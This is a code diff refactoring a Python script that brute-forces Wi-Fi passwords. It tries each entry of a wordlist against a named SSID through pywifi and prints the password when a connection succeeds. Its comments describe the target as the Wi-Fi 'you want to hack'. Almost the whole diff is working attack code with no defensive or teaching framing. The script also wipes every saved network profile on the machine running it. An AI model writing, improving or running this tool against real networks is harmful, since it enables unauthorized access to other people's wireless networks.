@@ -19,9 +19,8 @@ import colorama
 
 colorama.init()
 
-import wifi
-from const import *
-
+import helpers.wifi
+from helpers.constants import *
 
 # Change According to needs -->
 # cient_ssid == name of the wifi which you want to hack
@@ -40,14 +39,11 @@ logging.basicConfig(
     stream=sys.stdout,
     force=True,
 )
+
+
 # logging.getLogger('pywifi').setLevel(logging.NOTSET)
 
-
-wifi.initwifi()
-
-type = False
-exit()
-
+# type = False
 
 def main(ssid, password, number):
     profile = Profile()  # create profile instance
@@ -57,34 +53,35 @@ def main(ssid, password, number):
     profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
     profile.key = password  # use generated password
 
-    print("network_profiles: ", len(iface.network_profiles()))
+    print("network_profiles: ", len(wifi.iface.network_profiles()))
     print("remove_all_network_profiles")
-    iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
+    wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
 
-    print("network_profiles: ", len(iface.network_profiles()))
+    print("network_profiles: ", len(wifi.iface.network_profiles()))
 
-    tmp_profile = iface.add_network_profile(profile)  # add new profile
+    tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile
 
     for var in vars(tmp_profile):
         print(f"{var:15}: {getattr(tmp_profile, var)}")
 
     time.sleep(0.1)  # if script not working change time to 1 !!!!!!
-    iface.connect(tmp_profile)  # trying to Connect
+    wifi.iface.connect(tmp_profile)  # trying to Connect
     time.sleep(0.35)  # 1s
 
-    if iface.status() == const.IFACE_CONNECTED:  # checker
+    if wifi.iface.status() == const.IFACE_CONNECTED:  # checker
         time.sleep(1)
         print(BOLD, GREEN, '[*] Crack success!', RESET)
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
-        iface.disconnect()
+        wifi.iface.disconnect()
         time.sleep(1)
         exit()
     else:
-        print(RED, '[{}] Crack Failed using {}'.format(number, password))
+        print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))
 
 
 # opening and reading the file
 def pwd(ssid, file):
+    print(BOLD, "[~] Cracking...")
     number = 0
     with open(file, 'r', encoding='utf8') as words:
         for line in words:
@@ -100,8 +97,22 @@ def menu(client_ssid, path_to_file):
     parser = argparse.ArgumentParser(description='argparse Example')
 
     # adding arguments
-    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
-    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
+    parser.add_argument(
+        '-s',
+        '--ssid',
+        metavar='',
+        type=str,
+        help='SSID = WIFI Name..',
+        required=True
+    )
+    parser.add_argument(
+        '-w',
+        '--wordlist',
+        metavar='',
+        type=str,
+        help='keywords list ...',
+        required=True
+    )
 
     print()
 
@@ -111,31 +122,38 @@ def menu(client_ssid, path_to_file):
     time.sleep(1.5)
 
     # taking wordlist and ssid if given else take default
-    if args.wordlist and args.ssid:
-        ssid = args.ssid
-        filee = args.wordlist
-    else:
-        print(BLUE)
-        ssid = client_ssid
-        filee = path_to_file
+    # if args.wordlist and args.ssid:
+    #     ssid = args.ssid
+    #     filee = args.wordlist
+    # else:
+    #     print(BLUE)
+    #     # ssid = client_ssid
+    #     # filee = path_to_file
+    #     return None
 
-        # breaking
+    ssid = args.ssid
+    filee = args.wordlist
+
+    # breaking
     if os.path.exists(filee):
-        pass
+        # pass
         #     if platform.system().startswith("Win" or "win"):
         #         os.system("cls")
         #     else:
         #         os.system("clear")
-
-        print(BLUE, "[~] Cracking...")
-        pwd(ssid, filee)
-
+        print(CYAN, PLUS, f"ssid: {ssid}")
+        print(CYAN, PLUS, f"file: {filee}", RESET)
+        return ssid, filee
     else:
-        print(RED, "[-] No Such File.", BLUE)
+        print(LIGHT_RED, MINUS, f"No Such File: {filee}, terminating", RESET)
+        exit()
 
 
-# Main function call
-menu(client_ssid="", path_to_file="")
+if __name__ == '__main__':
+    # Main function call
+    ssid, filee = menu(client_ssid="", path_to_file="")
+    wifi = helpers.wifi.Wifi()
+    pwd(ssid, filee)
 
 ###########################################################################################################################################################
 # END OF FILE
